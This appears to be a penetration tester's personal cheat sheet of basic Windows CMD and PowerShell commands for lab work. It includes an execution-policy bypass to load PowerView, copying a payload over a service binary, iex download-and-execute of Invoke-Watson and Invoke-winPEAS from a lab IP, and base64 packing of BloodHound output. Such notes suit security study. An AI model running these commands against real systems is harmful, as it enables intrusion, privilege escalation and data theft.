---
description: The basic of Powershell and CMD
---

# Basic Command

This note was created when I was not very familiar with the Windows environment. I didn't know how to restart the machine from the command line, copy files, or import PowerShell scripts, etc.

### Import Module to Powershell

```powershell
powershell -ep bypass
Import-Module .\PowerView.ps1
# or
. .\PowerView.ps1
```

### Copy command

```powershell
# copy files
copy payload.exe "C:\Program Files\Service.exe"
# copy directory name Tools to new directory "MyTools"
xcopy Tools "C:\Users\Administrator\Desktop\MyTools" /E /I
```

### Rename command

```powershell
# Rename Payload.exe to Service.exe
ren Payload.exe Service.exe
```

### Download files

{% code overflow="wrap" %}
```powershell
# CMD: certutil
certutil -urlcache -split -f https://example.com/example.txt example.txt
# Powershell: Invoke-WebRequest
iwr -Uri "http://172.16.8.1:9005/PowerView.ps1" -O "PowerView.ps1"
# Powershell: Invoke-Expression
iex ((New-Object Net.WebClient).DownloadString("http://172.16.8.1:9005/Invoke-Watson.ps1"))
```
{% endcode %}

### Download and Execute Invoke-WinPEAS

* [**Invoke-WinPEAS**](https://raw.githubusercontent.com/BC-SECURITY/Empire/main/empire/server/data/module\_source/privesc/Invoke-winPEAS.ps1)

{% code overflow="wrap" %}
```powershell
iex ((New-Object Net.WebClient).DownloadString("http://172.16.8.1:9005/Invoke-winPEAS.ps1"))
```
{% endcode %}

### Restart and Reboot

```powershell
 # Shutdown now
 shutdown /s /t 0 /f
 # Restart
 shutdown /r /t 0 /f
```

### Convert to Base64

{% code overflow="wrap" %}
```powershell
[convert]::ToBase64String((Get-Content -path "20230908145747_BloodHound.zip" -Encoding byte))
```
{% endcode %}

### Others

Check privileges

```
whoami /all
whoami /priv
```

Check Group List

```powershell
Get-LocalGroup
net localgroup
Get-ADGroup -filter * -properties * |select SAMAccountName, Description
```

Check group member

{% code overflow="wrap" %}
```powershell
Get-LocalGroupMember -Group "Administrators"
Get-ADGroupMember -Identity Administrators | Select-Object name, objectClass,distinguishedName
```
{% endcode %}
